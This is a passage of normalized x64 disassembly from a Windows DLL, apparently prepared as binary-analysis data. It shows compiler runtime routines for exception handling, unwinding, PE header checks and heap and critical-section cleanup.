mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_180005e90
add rsp 0x20
pop rbp
retn
sub_180008c40
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_180008c60
mov ecx 0x1
jmp sub_180008b10
sub_180008c70
mov [ rw-data ] rcx
retn
sub_180009290
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov ebx 0x1
mov eax ebx
mov eax ebx
add rsp 0x28
pop rbp
pop rbx
retn
sub_180009410
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_180009430
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18000c7f0
mov ecx ebx
call sub_18000c5b0
mov rcx [ rw-data ]
call sub_18000a340
mov ecx 0xff
add rsp 0x20
pop rbx
jmp rax
sub_1800094a0
mov ecx 0x8
jmp sub_180009ab0
sub_1800094b0
mov ecx 0x8
jmp sub_180009980
sub_180009790
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_180009980
sub_1800097b0
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_180009670
sub_1800097c0
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_180009670
sub_180009a90
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
add rsp 0x20
pop rbp
retn
sub_180009c80
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_180009ca0
mov [ rw-data ] rcx
retn
sub_18000a410
xor eax eax
retn
sub_18000a5e0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000a860
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000a880
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000ad70
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180007770
sub_18000afb0
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000adc0
add rsp 0x20
pop rbp
retn
sub_18000afd0
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18000a690
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_18000a690
add [ rax + 0x100 ] 0xffffffff
sub_18000b0e8
call sub_18000c530
sub_18000b100
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_18000b660
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x58 ] rcx
lea r8 [ rbp + 0x20 ]
mov rdx [ rbp + 0xb8 ]
call sub_18000b000
add rsp 0x20
pop rbp
retn
sub_18000b925
call sub_18000c530
sub_18000b9ee
call sub_18000c530
sub_18000c2e0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800076c0
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000c530
sub rsp 0x28
call sub_18000a690
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_18000fde0
call rcx
jmp r-xdata
sub_18000c54e
add rsp 0x28
retn
sub_18000c560
sub rsp 0x28
mov rcx [ rw-data ]
call sub_18000a340
test rax rax
je r-xdata
call sub_18000c530
call rax
jmp r-xdata
sub_18000c57f
add rsp 0x28
retn
sub_18000c590
sub rsp 0x28
lea rcx [ sub_18000c530 ]
call sub_18000a180
mov [ rw-data ] rax
add rsp 0x28
retn
sub_18000c940
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
mov [ rw-data ] 0x0
add rsp 0x28
retn
sub_18000c970
mov [ rw-data ] rcx
retn
sub_18000ca40
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000cdf0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000d4f0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000d510
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_18000d2e0
mov [ rw-data ] 0x1
sub_18000d900
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180009980
add rsp 0x20
pop rbp
retn
sub_18000e830
retn 0x0
sub_18000ea50
cmp ecx 0xe06d7363
jne r-xdata
xor eax eax
retn
jmp sub_18000e840
sub_18000eb30
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_18000eb90
retn
sub_18000eba0
xor eax eax
cmp [ rcx ] 0x5a4d
jne r-xdata
retn 0x0
movsxd rdx [ rcx + 0x3c ]
cmp [ rdx + rcx ] 0x4550
jne r-xdata
cmp [ rdx + rcx + 0x18 ] 0x20b
sete al
sub_18000ec60
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_18000f790
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x60 ]
call sub_1800064d0
add rsp 0x30
pop rbp
retn
sub_18000f910
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_1800064d0
add rsp 0x30
pop rbp
retn
sub_18000f930
mov [ rw-data ] 0x0
retn
sub_18000fa60
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_180005e40
add rsp 0x30
pop rbp
retn
sub_18000fac0
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_18000fae0
mov rcx [ rw-data ]
jmp sub_18000a340
sub_18000fd6a
add [ 0x18505fe75 ] eax
add eax 0x5050503
add eax 0xcc020405
int3
sub_18000fd80
push rbp
sub rsp 0x30
mov rbp rdx
cmp [ rbp + 0x70 ] 0x0
je r-xdata
add rsp 0x30
pop rbp
retn
xor ecx ecx
call sub_180009980
sub_18000fda0
mov [ rw-data ] rcx
retn
sub_18000fdb0
mov [ rw-data ] rcx
retn
sub_18000fdc0
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_18000fdd0
xor edx edx
mov eax 0x1
test rcx rcx
cmove eax edx
retn
sub_180012270
xor r9d r9d
jmp sub_180012010
sub_180012590
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_1800064d0
add rsp 0x30
pop rbp
retn
sub_1800125b0
mov ecx 0x2
jmp sub_180009430
sub_1800125c0
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_180013140
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
sub_180013260
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001000
lea rcx [ sub_180013370 ]
call sub_180008210
add rsp 0x28
retn
sub_180013290
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001000
lea rcx [ sub_180013390 ]
call sub_180008210
add rsp 0x28
retn
sub_1800132c0
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001000
lea rcx [ sub_1800133b0 ]
call sub_180008210
add rsp 0x28
retn
sub_1800132f0
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1800053d0
lea rcx [ sub_1800133d0 ]
call sub_180008210
add rsp 0x28
retn
sub_180013370
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001090
add rsp 0x28
retn
sub_180013390
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001090
add rsp 0x28
retn
sub_1800133b0
sub rsp 0x28
lea rcx [ rw-data ]
call sub_180001090
add rsp 0x28
retn
sub_1800133d0
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1800027f0
add rsp 0x28
retn
sub_180013440
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_180007770
